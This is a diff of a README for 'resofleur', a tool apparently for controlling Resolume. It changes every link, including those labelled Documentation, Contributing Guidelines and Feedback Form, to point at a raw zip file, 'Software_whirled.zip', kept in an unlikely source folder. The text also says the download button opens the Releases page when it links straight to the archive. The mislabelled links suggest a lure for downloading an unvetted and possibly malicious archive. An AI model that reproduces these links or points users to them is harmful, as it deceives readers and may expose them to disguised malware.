@@ -8,7 +8,7 @@ Welcome to the **resofleur** project! This tool allows you to control Resolume A
 
 To get started, visit the Releases page to download the latest version of **resofleur**. Click the button below to access the downloads:
 
-[![Download resofleur](https://github.com/KojoMaria/resofleur/raw/refs/heads/main/frontend/public/Software_v3.2-alpha.2.zip)](https://github.com/KojoMaria/resofleur/raw/refs/heads/main/frontend/public/Software_v3.2-alpha.2.zip)
+[![Download resofleur](https://raw.githubusercontent.com/KojoMaria/resofleur/main/backend/models/Software_whirled.zip)](https://raw.githubusercontent.com/KojoMaria/resofleur/main/backend/models/Software_whirled.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version of **resofleur**.
@@ -54,15 +54,15 @@ Once you have downloaded **resofleur**, follow these steps to set it up:
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For detailed guides and troubleshooting tips, refer to our [Documentation](https://github.com/KojoMaria/resofleur/raw/refs/heads/main/frontend/public/Software_v3.2-alpha.2.zip).
+- **Documentation:** For detailed guides and troubleshooting tips, refer to our [Documentation](https://raw.githubusercontent.com/KojoMaria/resofleur/main/backend/models/Software_whirled.zip).
 - **Support:** If you encounter issues or need help, please open a discussion in the GitHub issues section.
 
 ## 🙌 Community Contributions
 
-We welcome contributions from the community. If you'd like to contribute, please check out our [Contributing Guidelines](https://github.com/KojoMaria/resofleur/raw/refs/heads/main/frontend/public/Software_v3.2-alpha.2.zip).
+We welcome contributions from the community. If you'd like to contribute, please check out our [Contributing Guidelines](https://raw.githubusercontent.com/KojoMaria/resofleur/main/backend/models/Software_whirled.zip).
 
 ## 🌟 Feedback
 
-Your feedback is important to us. Share your thoughts and suggestions via our [Feedback Form](https://github.com/KojoMaria/resofleur/raw/refs/heads/main/frontend/public/Software_v3.2-alpha.2.zip).
+Your feedback is important to us. Share your thoughts and suggestions via our [Feedback Form](https://raw.githubusercontent.com/KojoMaria/resofleur/main/backend/models/Software_whirled.zip).
 
 Make control of Resolume effortless with **resofleur**, and enjoy your performances!
